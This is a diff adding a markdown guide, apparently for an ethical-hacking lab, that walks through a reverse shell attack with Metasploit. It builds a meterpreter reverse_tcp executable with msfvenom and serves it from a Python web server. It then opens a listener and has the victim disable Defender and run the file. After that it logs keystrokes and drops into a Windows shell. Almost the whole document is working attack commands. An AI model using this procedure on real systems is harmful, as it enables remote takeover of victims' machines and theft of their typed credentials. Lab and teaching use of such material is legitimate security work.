@@ -1,0 +1,128 @@
+# 📌 **Reverse Shell Attack using Metasploit — Linux Commands**
+
+### ✅ **Part 1: Prepare Payload with `msfvenom`**
+
+```bash
+# 1️⃣ Become root (recommended)
+sudo -s
+
+# 2️⃣ Check your Kali IP address
+ip a
+
+# Example output: 10.60.0.7
+
+# 3️⃣ Generate reverse shell payload EXE (replace IP & port if needed)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.60.0.7 LPORT=4444 -f exe > payload.exe
+
+# 4️⃣ Verify payload file
+ls -l payload.exe
+```
+
+---
+
+### ✅ **Part 2: Host the Payload using Python Web Server**
+
+```bash
+# 1️⃣ Go to home directory (or where payload.exe is)
+cd ~
+
+# 2️⃣ Start simple HTTP server on port 80
+# Python 3 syntax:
+python3 -m http.server 80
+
+# Keep this terminal running! It serves payload.exe to victim.
+```
+
+---
+
+### ✅ **Part 3: Start Metasploit Handler**
+
+```bash
+# 1️⃣ Open a new terminal in Kali
+sudo msfconsole
+
+# 2️⃣ Load handler
+msf6 > use multi/handler
+
+# 3️⃣ Set payload type
+msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
+
+# 4️⃣ Set LHOST to your Kali IP
+msf6 exploit(multi/handler) > set LHOST 10.60.0.7
+
+# 5️⃣ Set LPORT
+msf6 exploit(multi/handler) > set LPORT 4444
+
+# 6️⃣ Double-check options
+msf6 exploit(multi/handler) > show options
+
+# 7️⃣ Start the listener
+msf6 exploit(multi/handler) > exploit
+```
+
+✅ Now wait for the victim to download & run **payload.exe**
+
+---
+
+### ✅ **Part 4: On the Victim Machine**
+
+📌 _No Linux commands here — Victim browses `http://10.60.0.7` in Edge → downloads `payload.exe` → disables Defender → runs it._
+
+---
+
+### ✅ **Part 5: Once Meterpreter Session Opens**
+
+```bash
+# In the same Metasploit console:
+meterpreter > help
+
+# Start keystroke logging
+meterpreter > keyscan_start
+
+# Do something on victim, then dump keys
+meterpreter > keyscan_dump
+
+# Stop logging
+meterpreter > keyscan_stop
+
+# Drop into Windows shell
+meterpreter > shell
+
+# Example: Open Edge
+C:\Windows\System32> start msedge.exe
+
+# Or kill Edge
+C:\Windows\System32> TASKKILL /F /IM msedge.exe
+
+# Exit Windows shell back to Meterpreter
+C:\Windows\System32> exit
+```
+
+✅ **Tip:** You can also run:
+
+```bash
+meterpreter > sysinfo
+meterpreter > ps
+```
+
+to see system info and processes.
+
+---
+
+### ✅ **Part 6: Clean Exit**
+
+```bash
+# When done, exit Meterpreter
+meterpreter > exit
+
+# Or stop msfconsole
+msf6 exploit(multi/handler) > exit
+```
+
+---
+
+## ✅ **REFERENCE**
+
+🔗 [Full Guide by Anbu HackOps](https://medium.com/@anbuhackops/ethical-hacking-reverse-shell-attack-using-metasploit-57e9cd400c88)
+
+---
